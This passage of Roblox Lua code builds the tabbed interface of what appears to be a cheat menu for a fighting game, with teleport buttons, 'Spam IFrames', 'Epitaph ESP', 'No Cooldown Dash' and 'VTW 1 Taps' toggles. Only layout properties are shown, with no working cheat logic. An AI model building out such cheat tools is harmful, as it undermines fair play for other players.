Stand.BorderColor3 = Color3.fromRGB(0, 0, 0)
Stand.BorderSizePixel = 5
Stand.Position = UDim2.new(0.305000007, 0, 0.969522178, 0)
Stand.Size = UDim2.new(0, 70, 0, 30)
Stand.Font = Enum.Font.SourceSans
Stand.Text = ""
Stand.TextColor3 = Color3.fromRGB(0, 0, 0)
Stand.TextScaled = true
Stand.TextSize = 14.000
Stand.TextWrapped = true

HealthBars.Name = "HealthBars"
HealthBars.Parent = Tab6_2
HealthBars.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HealthBars.BackgroundTransparency = 1.000
HealthBars.BorderColor3 = Color3.fromRGB(0, 0, 0)
HealthBars.BorderSizePixel = 0
HealthBars.Position = UDim2.new(0.0825242698, 0, 0.40625, 0)
HealthBars.Size = UDim2.new(0, 200, 0, 50)
HealthBars.Font = Enum.Font.ArialBold
HealthBars.Text = "Health Bars"
HealthBars.TextColor3 = Color3.fromRGB(0, 0, 0)
HealthBars.TextScaled = true
HealthBars.TextSize = 14.000
HealthBars.TextWrapped = true

HealthBarsButton.Name = "HealthBarsButton"
HealthBarsButton.Parent = HealthBars
HealthBarsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HealthBarsButton.BackgroundTransparency = 1.000
HealthBarsButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
HealthBarsButton.BorderSizePixel = 0
HealthBarsButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
HealthBarsButton.Size = UDim2.new(0, 20, 0, 32)
HealthBarsButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

Tab7_2.Name = "Tab7"
Tab7_2.Parent = Tabs
Tab7_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab7_2.BackgroundTransparency = 0.500
Tab7_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab7_2.BorderSizePixel = 5
Tab7_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Tab7_2.Size = UDim2.new(0, 412, 0, 224)
Tab7_2.Visible = false

TextLabel_7.Parent = Tab7_2
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_7.BorderSizePixel = 5
TextLabel_7.Size = UDim2.new(0, 412, 0, 22)
TextLabel_7.Font = Enum.Font.Unknown
TextLabel_7.Text = "TAB 7"
TextLabel_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_7.TextScaled = true
TextLabel_7.TextSize = 14.000
TextLabel_7.TextWrapped = true

TPButtonBasePlate.Name = "TPButtonBasePlate"
TPButtonBasePlate.Parent = Tab7_2
TPButtonBasePlate.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TPButtonBasePlate.BorderColor3 = Color3.fromRGB(255, 255, 255)
TPButtonBasePlate.BorderSizePixel = 2
TPButtonBasePlate.Position = UDim2.new(0.0267088059, 0, 0.608035684, 0)
TPButtonBasePlate.Size = UDim2.new(0, 75, 0, 36)
TPButtonBasePlate.Font = Enum.Font.SourceSans
TPButtonBasePlate.Text = "Baseplate"
TPButtonBasePlate.TextColor3 = Color3.fromRGB(0, 0, 0)
TPButtonBasePlate.TextSize = 14.000
TPButtonBasePlate.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TPButtonBasePlate.TextStrokeTransparency = 0.000

TPButtonWaterfall.Name = "TPButtonWaterfall"
TPButtonWaterfall.Parent = Tab7_2
TPButtonWaterfall.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TPButtonWaterfall.BorderColor3 = Color3.fromRGB(255, 255, 255)
TPButtonWaterfall.BorderSizePixel = 2
TPButtonWaterfall.Position = UDim2.new(0.0267088059, 0, 0.800000012, 0)
TPButtonWaterfall.Size = UDim2.new(0, 75, 0, 36)
TPButtonWaterfall.Font = Enum.Font.SourceSans
TPButtonWaterfall.Text = "Waterfall"
TPButtonWaterfall.TextColor3 = Color3.fromRGB(0, 0, 0)
TPButtonWaterfall.TextSize = 14.000
TPButtonWaterfall.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TPButtonWaterfall.TextStrokeTransparency = 0.000

TPButtonArenaLeft.Name = "TPButtonArenaLeft"
TPButtonArenaLeft.Parent = Tab7_2
TPButtonArenaLeft.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TPButtonArenaLeft.BorderColor3 = Color3.fromRGB(255, 255, 255)
TPButtonArenaLeft.BorderSizePixel = 2
TPButtonArenaLeft.Position = UDim2.new(0.0267088059, 0, 0.233500004, 0)
TPButtonArenaLeft.Size = UDim2.new(0, 75, 0, 36)
TPButtonArenaLeft.Font = Enum.Font.SourceSans
TPButtonArenaLeft.Text = "Arena Left"
TPButtonArenaLeft.TextColor3 = Color3.fromRGB(0, 0, 0)
TPButtonArenaLeft.TextSize = 14.000
TPButtonArenaLeft.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TPButtonArenaLeft.TextStrokeTransparency = 0.000

TPButtonStandChangerNpc.Name = "TPButtonStandChangerNpc"
TPButtonStandChangerNpc.Parent = Tab7_2
TPButtonStandChangerNpc.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TPButtonStandChangerNpc.BorderColor3 = Color3.fromRGB(255, 255, 255)
TPButtonStandChangerNpc.BorderSizePixel = 2
TPButtonStandChangerNpc.Position = UDim2.new(0.0267088059, 0, 0.421535701, 0)
TPButtonStandChangerNpc.Size = UDim2.new(0, 75, 0, 36)
TPButtonStandChangerNpc.Font = Enum.Font.SourceSans
TPButtonStandChangerNpc.Text = "Timmy"
TPButtonStandChangerNpc.TextColor3 = Color3.fromRGB(0, 0, 0)
TPButtonStandChangerNpc.TextSize = 14.000
TPButtonStandChangerNpc.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TPButtonStandChangerNpc.TextStrokeTransparency = 0.000

TPButtonFarmZone.Name = "TPButtonFarmZone"
TPButtonFarmZone.Parent = Tab7_2
TPButtonFarmZone.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TPButtonFarmZone.BorderColor3 = Color3.fromRGB(255, 255, 255)
TPButtonFarmZone.BorderSizePixel = 2
TPButtonFarmZone.Position = UDim2.new(0.39564085, 0, 0.608035684, 0)
TPButtonFarmZone.Size = UDim2.new(0, 75, 0, 36)
TPButtonFarmZone.Font = Enum.Font.SourceSans
TPButtonFarmZone.Text = "Farm Zone"
TPButtonFarmZone.TextColor3 = Color3.fromRGB(0, 0, 0)
TPButtonFarmZone.TextSize = 14.000
TPButtonFarmZone.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TPButtonFarmZone.TextStrokeTransparency = 0.000

TPButtonLoadingScreen.Name = "TPButtonLoadingScreen"
TPButtonLoadingScreen.Parent = Tab7_2
TPButtonLoadingScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TPButtonLoadingScreen.BorderColor3 = Color3.fromRGB(255, 255, 255)
TPButtonLoadingScreen.BorderSizePixel = 2
TPButtonLoadingScreen.Position = UDim2.new(0.39564085, 0, 0.421535701, 0)
TPButtonLoadingScreen.Size = UDim2.new(0, 75, 0, 36)
TPButtonLoadingScreen.Font = Enum.Font.SourceSans
TPButtonLoadingScreen.Text = "Loading Screen"
TPButtonLoadingScreen.TextColor3 = Color3.fromRGB(0, 0, 0)
TPButtonLoadingScreen.TextSize = 14.000
TPButtonLoadingScreen.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TPButtonLoadingScreen.TextStrokeTransparency = 0.000

TPButtonArenaRight.Name = "TPButtonArenaRight"
TPButtonArenaRight.Parent = Tab7_2
TPButtonArenaRight.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TPButtonArenaRight.BorderColor3 = Color3.fromRGB(255, 255, 255)
TPButtonArenaRight.BorderSizePixel = 2
TPButtonArenaRight.Position = UDim2.new(0.39564085, 0, 0.233500004, 0)
TPButtonArenaRight.Size = UDim2.new(0, 75, 0, 36)
TPButtonArenaRight.Font = Enum.Font.SourceSans
TPButtonArenaRight.Text = "Arena Right"
TPButtonArenaRight.TextColor3 = Color3.fromRGB(0, 0, 0)
TPButtonArenaRight.TextSize = 14.000
TPButtonArenaRight.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TPButtonArenaRight.TextStrokeTransparency = 0.000

TPButtonBossEntrance.Name = "TPButtonBossEntrance"
TPButtonBossEntrance.Parent = Tab7_2
TPButtonBossEntrance.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TPButtonBossEntrance.BorderColor3 = Color3.fromRGB(255, 255, 255)
TPButtonBossEntrance.BorderSizePixel = 2
TPButtonBossEntrance.Position = UDim2.new(0.39564085, 0, 0.800000012, 0)
TPButtonBossEntrance.Size = UDim2.new(0, 75, 0, 36)
TPButtonBossEntrance.Font = Enum.Font.SourceSans
TPButtonBossEntrance.Text = "Boss Arena"
TPButtonBossEntrance.TextColor3 = Color3.fromRGB(0, 0, 0)
TPButtonBossEntrance.TextSize = 14.000
TPButtonBossEntrance.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TPButtonBossEntrance.TextStrokeTransparency = 0.000

TPButtonMiddle.Name = "TPButtonMiddle"
TPButtonMiddle.Parent = Tab7_2
TPButtonMiddle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TPButtonMiddle.BorderColor3 = Color3.fromRGB(255, 255, 255)
TPButtonMiddle.BorderSizePixel = 2
TPButtonMiddle.Position = UDim2.new(0.745155394, 0, 0.608035684, 0)
TPButtonMiddle.Size = UDim2.new(0, 75, 0, 36)
TPButtonMiddle.Font = Enum.Font.SourceSans
TPButtonMiddle.Text = "Middle"
TPButtonMiddle.TextColor3 = Color3.fromRGB(0, 0, 0)
TPButtonMiddle.TextSize = 14.000
TPButtonMiddle.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TPButtonMiddle.TextStrokeTransparency = 0.000

TPButtonZeldaMoon.Name = "TPButtonZeldaMoon"
TPButtonZeldaMoon.Parent = Tab7_2
TPButtonZeldaMoon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TPButtonZeldaMoon.BorderColor3 = Color3.fromRGB(255, 255, 255)
TPButtonZeldaMoon.BorderSizePixel = 2
TPButtonZeldaMoon.Position = UDim2.new(0.745155394, 0, 0.421535701, 0)
TPButtonZeldaMoon.Size = UDim2.new(0, 75, 0, 36)
TPButtonZeldaMoon.Font = Enum.Font.SourceSans
TPButtonZeldaMoon.Text = "Zelda Moon"
TPButtonZeldaMoon.TextColor3 = Color3.fromRGB(0, 0, 0)
TPButtonZeldaMoon.TextSize = 14.000
TPButtonZeldaMoon.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TPButtonZeldaMoon.TextStrokeTransparency = 0.000

TPButtonRachaelHouse.Name = "TPButtonRachaelHouse"
TPButtonRachaelHouse.Parent = Tab7_2
TPButtonRachaelHouse.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TPButtonRachaelHouse.BorderColor3 = Color3.fromRGB(255, 255, 255)
TPButtonRachaelHouse.BorderSizePixel = 2
TPButtonRachaelHouse.Position = UDim2.new(0.745155394, 0, 0.233500004, 0)
TPButtonRachaelHouse.Size = UDim2.new(0, 75, 0, 36)
TPButtonRachaelHouse.Font = Enum.Font.SourceSans
TPButtonRachaelHouse.Text = "Shed"
TPButtonRachaelHouse.TextColor3 = Color3.fromRGB(0, 0, 0)
TPButtonRachaelHouse.TextSize = 14.000
TPButtonRachaelHouse.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TPButtonRachaelHouse.TextStrokeTransparency = 0.000

TPButtonD4C.Name = "TPButtonD4C"
TPButtonD4C.Parent = Tab7_2
TPButtonD4C.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TPButtonD4C.BorderColor3 = Color3.fromRGB(255, 255, 255)
TPButtonD4C.BorderSizePixel = 2
TPButtonD4C.Position = UDim2.new(0.745155394, 0, 0.800000012, 0)
TPButtonD4C.Size = UDim2.new(0, 75, 0, 36)
TPButtonD4C.Font = Enum.Font.SourceSans
TPButtonD4C.Text = "D4C Universe"
TPButtonD4C.TextColor3 = Color3.fromRGB(0, 0, 0)
TPButtonD4C.TextSize = 14.000
TPButtonD4C.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TPButtonD4C.TextStrokeTransparency = 0.000

Tab4_2.Name = "Tab4"
Tab4_2.Parent = Tabs
Tab4_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab4_2.BackgroundTransparency = 0.500
Tab4_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab4_2.BorderSizePixel = 5
Tab4_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Tab4_2.Size = UDim2.new(0, 412, 0, 224)
Tab4_2.Visible = false

VTWKnife.Name = "VTWKnife"
VTWKnife.Parent = Tab4_2
VTWKnife.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
VTWKnife.BackgroundTransparency = 1.000
VTWKnife.BorderColor3 = Color3.fromRGB(0, 0, 0)
VTWKnife.BorderSizePixel = 0
VTWKnife.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
VTWKnife.Size = UDim2.new(0, 200, 0, 50)
VTWKnife.Font = Enum.Font.ArialBold
VTWKnife.Text = "VTW Knife (K to Delete)"
VTWKnife.TextColor3 = Color3.fromRGB(0, 0, 0)
VTWKnife.TextScaled = true
VTWKnife.TextSize = 14.000
VTWKnife.TextWrapped = true

VTWKnifeButton.Name = "VTWKnifeButton"
VTWKnifeButton.Parent = VTWKnife
VTWKnifeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
VTWKnifeButton.BackgroundTransparency = 1.000
VTWKnifeButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
VTWKnifeButton.BorderSizePixel = 0
VTWKnifeButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
VTWKnifeButton.Size = UDim2.new(0, 20, 0, 32)
VTWKnifeButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

TextLabel_8.Parent = VTWKnife
TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.BackgroundTransparency = 1.000
TextLabel_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_8.BorderSizePixel = 0
TextLabel_8.Position = UDim2.new(1, 0, 0, 0)
TextLabel_8.Size = UDim2.new(0, 200, 0, 28)
TextLabel_8.Font = Enum.Font.ArialBold
TextLabel_8.Text = "Bind A Key"
TextLabel_8.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_8.TextSize = 25.000
TextLabel_8.TextWrapped = true

Keybind_2.Name = "Keybind"
Keybind_2.Parent = TextLabel_8
Keybind_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Keybind_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Keybind_2.BorderSizePixel = 5
Keybind_2.Position = UDim2.new(0.305000007, 0, 0.969522178, 0)
Keybind_2.Size = UDim2.new(0, 70, 0, 30)
Keybind_2.Font = Enum.Font.SourceSans
Keybind_2.Text = ""
Keybind_2.TextColor3 = Color3.fromRGB(0, 0, 0)
Keybind_2.TextScaled = true
Keybind_2.TextSize = 14.000
Keybind_2.TextWrapped = true

TextLabel_9.Parent = Tab4_2
TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_9.BorderSizePixel = 5
TextLabel_9.Size = UDim2.new(0, 412, 0, 22)
TextLabel_9.Font = Enum.Font.Unknown
TextLabel_9.Text = "TAB 4"
TextLabel_9.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_9.TextScaled = true
TextLabel_9.TextSize = 14.000
TextLabel_9.TextWrapped = true

OniIFrames.Name = "OniIFrames"
OniIFrames.Parent = Tab4_2
OniIFrames.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OniIFrames.BackgroundTransparency = 1.000
OniIFrames.BorderColor3 = Color3.fromRGB(0, 0, 0)
OniIFrames.BorderSizePixel = 0
OniIFrames.Position = UDim2.new(0.0825242698, 0, 0.40625, 0)
OniIFrames.Size = UDim2.new(0, 200, 0, 50)
OniIFrames.Font = Enum.Font.ArialBold
OniIFrames.Text = "Spam IFrames"
OniIFrames.TextColor3 = Color3.fromRGB(0, 0, 0)
OniIFrames.TextScaled = true
OniIFrames.TextSize = 14.000
OniIFrames.TextWrapped = true

OniIFramesButton.Name = "OniIFramesButton"
OniIFramesButton.Parent = OniIFrames
OniIFramesButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OniIFramesButton.BackgroundTransparency = 1.000
OniIFramesButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
OniIFramesButton.BorderSizePixel = 0
OniIFramesButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
OniIFramesButton.Size = UDim2.new(0, 20, 0, 32)
OniIFramesButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

EpiWarning.Name = "EpiWarning"
EpiWarning.Parent = Tab4_2
EpiWarning.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
EpiWarning.BackgroundTransparency = 1.000
EpiWarning.BorderColor3 = Color3.fromRGB(0, 0, 0)
EpiWarning.BorderSizePixel = 0
EpiWarning.Position = UDim2.new(0.0825242698, 0, 0.705357134, 0)
EpiWarning.Size = UDim2.new(0, 200, 0, 50)
EpiWarning.Font = Enum.Font.ArialBold
EpiWarning.Text = "Epitaph ESP"
EpiWarning.TextColor3 = Color3.fromRGB(0, 0, 0)
EpiWarning.TextScaled = true
EpiWarning.TextSize = 14.000
EpiWarning.TextWrapped = true

EpiWarningButton.Name = "EpiWarningButton"
EpiWarningButton.Parent = EpiWarning
EpiWarningButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
EpiWarningButton.BackgroundTransparency = 1.000
EpiWarningButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
EpiWarningButton.BorderSizePixel = 0
EpiWarningButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
EpiWarningButton.Size = UDim2.new(0, 20, 0, 32)
EpiWarningButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

Tab3_2.Name = "Tab3"
Tab3_2.Parent = Tabs
Tab3_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab3_2.BackgroundTransparency = 0.500
Tab3_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab3_2.BorderSizePixel = 5
Tab3_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Tab3_2.Size = UDim2.new(0, 412, 0, 224)
Tab3_2.Visible = false

ESplash.Name = "ESplash"
ESplash.Parent = Tab3_2
ESplash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ESplash.BackgroundTransparency = 1.000
ESplash.BorderColor3 = Color3.fromRGB(0, 0, 0)
ESplash.BorderSizePixel = 0
ESplash.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
ESplash.Size = UDim2.new(0, 200, 0, 50)
ESplash.Font = Enum.Font.ArialBold
ESplash.Text = "Emerald Splash"
ESplash.TextColor3 = Color3.fromRGB(0, 0, 0)
ESplash.TextScaled = true
ESplash.TextSize = 14.000
ESplash.TextWrapped = true

ESplashButton.Name = "ESplashButton"
ESplashButton.Parent = ESplash
ESplashButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ESplashButton.BackgroundTransparency = 1.000
ESplashButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
ESplashButton.BorderSizePixel = 0
ESplashButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
ESplashButton.Size = UDim2.new(0, 20, 0, 32)
ESplashButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

TextLabel_10.Parent = ESplash
TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.BackgroundTransparency = 1.000
TextLabel_10.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_10.BorderSizePixel = 0
TextLabel_10.Position = UDim2.new(1, 0, 0, 0)
TextLabel_10.Size = UDim2.new(0, 200, 0, 28)
TextLabel_10.Font = Enum.Font.ArialBold
TextLabel_10.Text = "Bind A Key"
TextLabel_10.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_10.TextSize = 25.000
TextLabel_10.TextWrapped = true

Keybind_3.Name = "Keybind"
Keybind_3.Parent = TextLabel_10
Keybind_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Keybind_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
Keybind_3.BorderSizePixel = 5
Keybind_3.Position = UDim2.new(0.305000007, 0, 0.969522178, 0)
Keybind_3.Size = UDim2.new(0, 70, 0, 30)
Keybind_3.Font = Enum.Font.SourceSans
Keybind_3.Text = ""
Keybind_3.TextColor3 = Color3.fromRGB(0, 0, 0)
Keybind_3.TextScaled = true
Keybind_3.TextSize = 14.000
Keybind_3.TextWrapped = true

TextLabel_11.Parent = Tab3_2
TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_11.BorderSizePixel = 5
TextLabel_11.Size = UDim2.new(0, 412, 0, 22)
TextLabel_11.Font = Enum.Font.Unknown
TextLabel_11.Text = "TAB 3"
TextLabel_11.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_11.TextScaled = true
TextLabel_11.TextSize = 14.000
TextLabel_11.TextWrapped = true

SpamSounds.Name = "SpamSounds"
SpamSounds.Parent = Tab3_2
SpamSounds.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SpamSounds.BackgroundTransparency = 1.000
SpamSounds.BorderColor3 = Color3.fromRGB(0, 0, 0)
SpamSounds.BorderSizePixel = 0
SpamSounds.Position = UDim2.new(0.0825242698, 0, 0.40625, 0)
SpamSounds.Size = UDim2.new(0, 200, 0, 50)
SpamSounds.Font = Enum.Font.ArialBold
SpamSounds.Text = "Spam Sounds"
SpamSounds.TextColor3 = Color3.fromRGB(0, 0, 0)
SpamSounds.TextScaled = true
SpamSounds.TextSize = 14.000
SpamSounds.TextWrapped = true

SpamSoundsButton.Name = "SpamSoundsButton"
SpamSoundsButton.Parent = SpamSounds
SpamSoundsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SpamSoundsButton.BackgroundTransparency = 1.000
SpamSoundsButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
SpamSoundsButton.BorderSizePixel = 0
SpamSoundsButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
SpamSoundsButton.Size = UDim2.new(0, 20, 0, 32)
SpamSoundsButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

TSMovement.Name = "TSMovement"
TSMovement.Parent = Tab3_2
TSMovement.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TSMovement.BackgroundTransparency = 1.000
TSMovement.BorderColor3 = Color3.fromRGB(0, 0, 0)
TSMovement.BorderSizePixel = 0
TSMovement.Position = UDim2.new(0.0825242698, 0, 0.705357134, 0)
TSMovement.Size = UDim2.new(0, 200, 0, 50)
TSMovement.Font = Enum.Font.ArialBold
TSMovement.Text = "TS Movement"
TSMovement.TextColor3 = Color3.fromRGB(0, 0, 0)
TSMovement.TextScaled = true
TSMovement.TextSize = 14.000
TSMovement.TextWrapped = true

TSMovementButton.Name = "TSMovementButton"
TSMovementButton.Parent = TSMovement
TSMovementButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TSMovementButton.BackgroundTransparency = 1.000
TSMovementButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TSMovementButton.BorderSizePixel = 0
TSMovementButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
TSMovementButton.Size = UDim2.new(0, 20, 0, 32)
TSMovementButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

Tab5_2.Name = "Tab5"
Tab5_2.Parent = Tabs
Tab5_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab5_2.BackgroundTransparency = 0.500
Tab5_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab5_2.BorderSizePixel = 5
Tab5_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Tab5_2.Size = UDim2.new(0, 412, 0, 224)
Tab5_2.Visible = false

SpinDash.Name = "SpinDash"
SpinDash.Parent = Tab5_2
SpinDash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SpinDash.BackgroundTransparency = 1.000
SpinDash.BorderColor3 = Color3.fromRGB(0, 0, 0)
SpinDash.BorderSizePixel = 0
SpinDash.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
SpinDash.Size = UDim2.new(0, 200, 0, 50)
SpinDash.Font = Enum.Font.ArialBold
SpinDash.Text = "No Cooldown Dash (Supports most stands, no spec support)"
SpinDash.TextColor3 = Color3.fromRGB(0, 0, 0)
SpinDash.TextScaled = true
SpinDash.TextSize = 14.000
SpinDash.TextWrapped = true

SpinDashButton.Name = "SpinDashButton"
SpinDashButton.Parent = SpinDash
SpinDashButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SpinDashButton.BackgroundTransparency = 1.000
SpinDashButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
SpinDashButton.BorderSizePixel = 0
SpinDashButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
SpinDashButton.Size = UDim2.new(0, 20, 0, 32)
SpinDashButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

TextLabel_12.Parent = Tab5_2
TextLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_12.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_12.BorderSizePixel = 5
TextLabel_12.Size = UDim2.new(0, 412, 0, 22)
TextLabel_12.Font = Enum.Font.Unknown
TextLabel_12.Text = "TAB 5"
TextLabel_12.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_12.TextScaled = true
TextLabel_12.TextSize = 14.000
TextLabel_12.TextWrapped = true

StandlessCounter.Name = "StandlessCounter"
StandlessCounter.Parent = Tab5_2
StandlessCounter.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
StandlessCounter.BackgroundTransparency = 1.000
StandlessCounter.BorderColor3 = Color3.fromRGB(0, 0, 0)
StandlessCounter.BorderSizePixel = 0
StandlessCounter.Position = UDim2.new(0.0825242698, 0, 0.705357134, 0)
StandlessCounter.Size = UDim2.new(0, 200, 0, 50)
StandlessCounter.Font = Enum.Font.ArialBold
StandlessCounter.Text = "Standless Counter"
StandlessCounter.TextColor3 = Color3.fromRGB(0, 0, 0)
StandlessCounter.TextScaled = true
StandlessCounter.TextSize = 14.000
StandlessCounter.TextWrapped = true

StandlessCounterButton.Name = "StandlessCounterButton"
StandlessCounterButton.Parent = StandlessCounter
StandlessCounterButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
StandlessCounterButton.BackgroundTransparency = 1.000
StandlessCounterButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
StandlessCounterButton.BorderSizePixel = 0
StandlessCounterButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
StandlessCounterButton.Size = UDim2.new(0, 20, 0, 32)
StandlessCounterButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

VTW1TapsBar.Name = "VTW1TapsBar"
VTW1TapsBar.Parent = Tab5_2
VTW1TapsBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
VTW1TapsBar.BackgroundTransparency = 1.000
VTW1TapsBar.BorderColor3 = Color3.fromRGB(0, 0, 0)
VTW1TapsBar.BorderSizePixel = 0
VTW1TapsBar.Position = UDim2.new(0.0825242698, 0, 0.40625, 0)
VTW1TapsBar.Size = UDim2.new(0, 200, 0, 50)
VTW1TapsBar.Font = Enum.Font.ArialBold
VTW1TapsBar.Text = "VTW 1 Taps"
VTW1TapsBar.TextColor3 = Color3.fromRGB(0, 0, 0)
VTW1TapsBar.TextScaled = true
VTW1TapsBar.TextSize = 14.000
VTW1TapsBar.TextWrapped = true

VTW1TapsButton.Name = "VTW1TapsButton"
VTW1TapsButton.Parent = VTW1TapsBar
VTW1TapsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
VTW1TapsButton.BackgroundTransparency = 1.000
VTW1TapsButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
VTW1TapsButton.BorderSizePixel = 0
VTW1TapsButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
VTW1TapsButton.Size = UDim2.new(0, 20, 0, 32)
VTW1TapsButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

Settings.Name = "Settings"
Settings.Parent = Tabs
Settings.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Settings.BackgroundTransparency = 1.000
Settings.BorderColor3 = Color3.fromRGB(0, 0, 0)
Settings.BorderSizePixel = 0
Settings.Position = UDim2.new(0.187984496, 0, 0, 0)
Settings.Size = UDim2.new(0, 419, 0, 224)
Settings.Visible = false

ScrollingFrame.Parent = Settings
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Size = UDim2.new(0, 419, 0, 223)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 1.5, 0)

ReduceLag.Name = "ReduceLag"
ReduceLag.Parent = ScrollingFrame
ReduceLag.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ReduceLag.BorderColor3 = Color3.fromRGB(255, 255, 255)
ReduceLag.BorderSizePixel = 2
ReduceLag.Position = UDim2.new(0.0170000009, 0, 0.0460000001, 0)
ReduceLag.Size = UDim2.new(0, 389, 0, 36)
